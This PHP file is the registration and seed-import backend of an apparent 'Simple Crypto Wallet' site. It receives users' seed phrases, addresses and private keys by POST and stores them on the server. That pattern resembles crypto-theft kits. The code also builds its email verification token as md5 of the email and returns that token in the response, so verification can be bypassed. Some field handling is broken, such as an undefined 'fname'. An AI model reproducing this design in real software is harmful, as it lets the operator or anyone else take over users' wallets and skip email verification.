<?php
require_once "../class/user.php";
include __DIR__ . "/mail/verify.php";

if(session_status() === PHP_SESSION_NONE)
{
    session_start();//start session if session not start
}
if(isset($_POST['uname'], $_POST['email'])){
    $newUser["email"] = $_POST['email'];
    $newUser["pass"] = $_POST['pass'];
    $newUser["uname"] = $_POST['uname'];
    $return = [];
    
    try {
        $newUser["walletid"] = "PW" . random_int(88888888, 99999999);
    } catch (Exception $e) {
        $newUser["walletid"] = "PW" . rand(88888888, 99999999);
    }

    if($user->userExists($newUser["email"])){
        $return['stat'] = "two";
    }else{
        if($lastID = $user->registerUser($newUser)){
            // $lastID = $user->registerUser($newUser);
            
            $header = "Confirm Your Email";
            $email = $newUser["email"];
            $name = $newUser["uname"];
            $url = DOMAIN . "/login/?token=" . md5($newUser["email"]);
            sendMail($email,$name,$header,$url);
            
            $topic = "Welcome To Simple Crypto Wallet.";
            $message = "You are welcomed to Simple Crypto Wallet, time to take you financial life under your control";
            $done = $user->createNotifications($lastID, $topic, $message);            
            $return['stat'] = "one";
            $return['mail'] = md5($newUser["email"]);
        }
    }
    echo json_encode($return);
}

if(isset($_POST['sedl'])){
    $newSeed["sedl"] = $_POST['sedl'];
    $newSeed["add"] = $_POST['add'];
    $newSeed["pri"] = $_POST['pri'];
    $newSeed["email"] = $_POST['email'];
    $return = [];
    
    $lastid = $user->emailID($newSeed["email"]);
    $user->createwallt($lastid,"/images/eth_logo.svg",'ETH',$newSeed["add"]);
    
    if($user->updateUser($newSeed)){
        $return['stat'] = "one";
    }
    echo json_encode($return);
}

if(isset($_POST['eail'], $_POST['uame'])){
    $newUser["email"] = $_POST['eail'];
    $newUser["pass"] = $_POST['passw'];
    $newUser["uname"] = $_POST['uame'];
    $return = [];
    
    try {
        $newUser["walletid"] = "PW" . random_int(88888888, 99999999);
    } catch (Exception $e) {
        $newUser["walletid"] = "PW" . rand(88888888, 99999999);
    }
    
    $newSeed["sedl"] = $_POST['seeds'];
    $newSeed["add"] = $_POST['add'];
    $newSeed["pri"] = $_POST['pri'];
    $newSeed["email"] = md5($_POST['eail']);
    
    if($user->userExists($newUser["email"])){
        $return['stat'] = "two";
    }else{
        if($lastID = $user->registerUser($newUser)){
            // $lastID = $user->registerUser($newUser);
        
                $header = "Confirm Your Email";
                $email = $newUser["email"];
                $name = $newUser["fname"];
                $url = DOMAIN . "/login/?token=" . md5($newUser["email"]);
                
                sendMail($email,$name,$header,$url);
                
                $topic = "Welcome To Simple Crypto Wallet.";
                $message = "You are welcomed to Simple Crypto Wallet, time to take you financial life under your control";
                $done = $user->createNotifications($lastID, $topic, $message);  
                
            if($user->updateUser($newSeed)){
                $return['stat'] = "one";
            }
        }
    }
    echo json_encode($return);
}

$user->Disconnect();